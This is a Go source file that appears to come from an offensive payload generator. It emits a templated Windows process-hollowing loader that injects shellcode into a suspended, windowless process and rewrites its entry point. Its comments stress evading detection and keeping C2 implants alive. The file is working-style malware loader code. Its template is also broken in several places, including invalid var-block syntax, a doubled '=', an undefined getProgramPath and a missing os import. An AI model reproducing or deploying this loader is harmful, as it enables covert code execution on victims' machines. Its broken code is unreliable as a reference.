package loaders

import (
	"fmt"
)

/*
   This Process Hollowing technique does not follow the classical method of

   CreateProcess -> get PEB -> unmapping section & overwrite with our shellcode
   -> modify PEB to overwrite entrypoint -> change back page permissions

   Instead, we add a new section in the virtual address space & change the
   entrypoint in PEB (adapted from go-shellcode / CreateProcess)

   This way, suspicious PAGE_EXECUTE_READWRITE permission settings are not set,
   and complexity is decreased, as there is not need to actually _hollow out_
   the whole entrypoint

   In the future, we could implement the more "classical" Process Injection, following
   the example of go-runpe project, for instance


   For more information, feel free to read this:
   https://www.blackhat.com/docs/asia-17/materials/asia-17-KA-What-Malware-Authors-Don't-Want-You-To-Know-Evasive-Hollow-Process-Injection-wp.pdf


   It still follows the principle of starting a program in a suspended state &
   overwrite entrypoint to run shellcode instead of actual program.

*/

func GetProcessHollowingTemplate(targetProcess string) string {
	return fmt.Sprintf(`
package main

import (
    "bytes"
	"debug/pe"
	"encoding/binary"
	"io/ioutil"
	"syscall"
	"unsafe"
    "os/exec"
    "path/filepath"
)


const (
    MEM_COMMIT                = 0x1000
    MEM_RESERVE               = 0x2000
    PAGE_READWRITE            = 0x4
    PAGE_EXECUTE_READ         = 0x20
    PAGE_EXECUTE_READWRITE    = 0x40
    CREATE_SUSPENDED          = 0x4
    CREATE_NO_WINDOW          = 0x8000000

    LITTLE_ENDIAN             = 0x5a4d
    IS64BITS                  = 0x8664


)

var (
    kernel32 = syscall.NewLazyDLL("kernel32.dll")

    ResumeThread  := kernel32.NewProc("ResumeThread")
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
    ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	ntdll = syscall.NewLazyDLL("ntdll.dll")
)

type PEB struct {
    InheritedAddressSpace    byte    // BYTE	0
    ReadImageFileExecOptions byte    // BYTE	1
    BeingDebugged            byte    // BYTE	2
    reserved2                [1]byte // BYTE 3
    Mutant                   uintptr     // BYTE 4
    ImageBaseAddress         uintptr     // BYTE 8
    Ldr                      uintptr     // PPEB_LDR_DATA
    ProcessParameters        uintptr     // PRTL_USER_PROCESS_PARAMETERS
    reserved4                [3]uintptr  // PVOID
    AtlThunkSListPtr         uintptr     // PVOID
    reserved5                uintptr     // PVOID
    reserved6                uint32      // ULONG
    reserved7                uintptr     // PVOID
    reserved8                uint32      // ULONG
    AtlThunkSListPtr32       uint32      // ULONG
    reserved9                [45]uintptr // PVOID
    reserved10               [96]byte    // BYTE
    PostProcessInitRoutine   uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
    reserved11               [128]byte   // BYTE
    reserved12               [1]uintptr  // PVOID
    SessionId                uint32      // ULONG
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}

type IMAGE_OPTIONAL_HEADER32 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	BaseOfData                  uint32 // Different from 64 bit header
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}

type PROCESS_BASIC_INFORMATION struct {
	reserved1                    uintptr    // PVOID
	PebBaseAddress               uintptr    // PPEB
	reserved2                    [2]uintptr // PVOID
	UniqueProcessId              uintptr    // ULONG_PTR
	InheritedFromUniqueProcessID uintptr    // PVOID
}

type IMAGE_DOS_HEADER struct {
	Magic    uint16     // USHORT Magic number
	Cblp     uint16     // USHORT Bytes on last page of file
	Cp       uint16     // USHORT Pages in file
	Crlc     uint16     // USHORT Relocations
	Cparhdr  uint16     // USHORT Size of header in paragraphs
	MinAlloc uint16     // USHORT Minimum extra paragraphs needed
	MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
	SS       uint16     // USHORT Initial (relative) SS value
	SP       uint16     // USHORT Initial SP value
	CSum     uint16     // USHORT Checksum
	IP       uint16     // USHORT Initial IP value
	CS       uint16     // USHORT Initial (relative) CS value
	LfaRlc   uint16     // USHORT File address of relocation table
	Ovno     uint16     // USHORT Overlay number
	Res      [4]uint16  // USHORT Reserved words
	OEMID    uint16     // USHORT OEM identifier (for e_oeminfo)
	OEMInfo  uint16     // USHORT OEM information; e_oemid specific
	Res2     [10]uint16 // USHORT Reserved words
	LfaNew   int32      // LONG File address of new exe header
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}


func loadProcess(target string) *syscall.ProcessInformation {
    var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	commandLine, err := syscall.UTF16PtrFromString(target)

	if err != nil {
		panic(err)
	}

    err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		panic(err)
	}

	return &pi
}

func getPath(program string) (string, error) {
    fname, err := exec.LookPath(program)
    if err != nil {
        return nil
    }

    return filepath.Abs(fname)
}


func ExecuteOrderSixtySix(shellcode []byte) {

    /* spawn target process in supsended state */
    process := loadProcess("%s")
    programPath := getProgramPath("%s")

    hProcess := uintptr(process.Process)
	hThread := uintptr(process.Thread)

    /* map memory for child process  */
    addr, _, _ := VirtualAllocEx.Call(
        hProcess,
        0,
        uintptr(len(shellcode)),
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE,
    )

    if addr == 0 {
        os.Exit(1)
    }


    /* write shellcode into child process memory */
    _, _, _ := WriteProcessMemory.Call(
        hProcess,
        addr,
        (uintptr)(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
    )

    /* change memory permissions to RX in child */
    oldProtect := PAGE_READWRITE
	_, _, _ := VirtualProtectEx.Call(
        hProcess,
        addr,
        uintptr(len(shellcode)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtect)),
    )

    /* Get process information */
    var processInformation PROCESS_BASIC_INFORMATION
	var returnLength uintptr

    status, _, _ := NtQueryInformationProcess.Call(
        hProcess,
        0,
        uintptr(unsafe.Pointer(&processInformation)),
        unsafe.Sizeof(processInformation),
        returnLength,
    ); if status != 0 { os.Exit(1) }


    /* retrieve PEB */

    var peb PEB
	var readBytes int32

    _, _, _ = = ReadProcessMemory.Call(
        hProcess,
        processInformation.PebBaseAddress,
        uintptr(unsafe.Pointer(&peb)),
        unsafe.Sizeof(peb),
        uintptr(unsafe.Pointer(&readBytes)),
    )


    /* retrieve dos header */

    var dosHeader IMAGE_DOS_HEADER

    _, _, _ = ReadProcessMemory.Call(
        hProcess,
        peb.ImageBaseAddress,
        uintptr(unsafe.Pointer(&dosHeader)),
        unsafe.Sizeof(dosHeader),
        uintptr(unsafe.Pointer(&readBytes)),
    )

    var Signature uint32

    _, _, _  = ReadProcessMemory.Call(
        hProcess,
        peb.ImageBaseAddress + uintptr(dosHeader.LfaNew),
        uintptr(unsafe.Pointer(&Signature)),
        unsafe.Sizeof(Signature),
        uintptr(unsafe.Pointer(&readBytes)),
    )

    /* FIXME(djnn): we only support little endian for now :( */
    if dosHeader.Magic != LITTLE_ENDIAN || Signature != 0x4550 {
        os.Exit(1)
    }


    /* retrieve PE file header now */
    var peHeader IMAGE_FILE_HEADER

    _, _, _ = ReadProcessMemory.Call(
        hProcess,
        peb.ImageBaseAddress + uintptr(dosHeader.LfaNew) + unsafe.Sizeof(Signature),
        uintptr(unsafe.Pointer(&peHeader)),
        unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes)),
    )


    /*
        now we can finally retrieve the optional header

        from here, we can overwrite entrypoint

    */

    var optHeader64 IMAGE_OPTIONAL_HEADER64
	var optHeader32 IMAGE_OPTIONAL_HEADER32

    var epBuffer []byte
	var shellcodeAddressBuffer []byte
    var ep uintptr

    if peHeader.Machine == IS64BITS {
        _, _, _ = ReadProcessMemory.Call(
            hProcess,
            peb.ImageBaseAddress + uintptr(dosHeader.LfaNew) + unsafe.Sizeof(Signature) + unsafe.Sizeof(peHeader),
            uintptr(unsafe.Pointer(&optHeader64)),
            unsafe.Sizeof(optHeader64),
            uintptr(unsafe.Pointer(&readBytes)),
        )

        ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)

        /* mov eax */
        epBuffer = append(epBuffer, byte(0x48))
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 8) // 8 bytes for 64-bit address
		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)


    } else {
        _, _, _ = ReadProcessMemory.Call(
            hProcess,
            peb.ImageBaseAddress + uintptr(dosHeader.LfaNew) + unsafe.Sizeof(Signature) + unsafe.Sizeof(peHeader),
            uintptr(unsafe.Pointer(&optHeader32)),
            unsafe.Sizeof(optHeader32),
            uintptr(unsafe.Pointer(&readBytes)),
        )

        ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)

        /* mov eax */
        epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
    }


    /* actually overwriting entrypoint in memory */
    _, _, _ = WriteProcessMemory.Call(
        hProcess,
        ep,
        uintptr(unsafe.Pointer(&epBuffer[0])),
        uintptr(len(epBuffer)),
    )


    /* resume thread */
    _, _ = ResumeThread.Call(hThread)


    /* block, so that process does not die (useful for C2 implants) */
    select {}
}
    `, targetProcess, targetProcess)
}
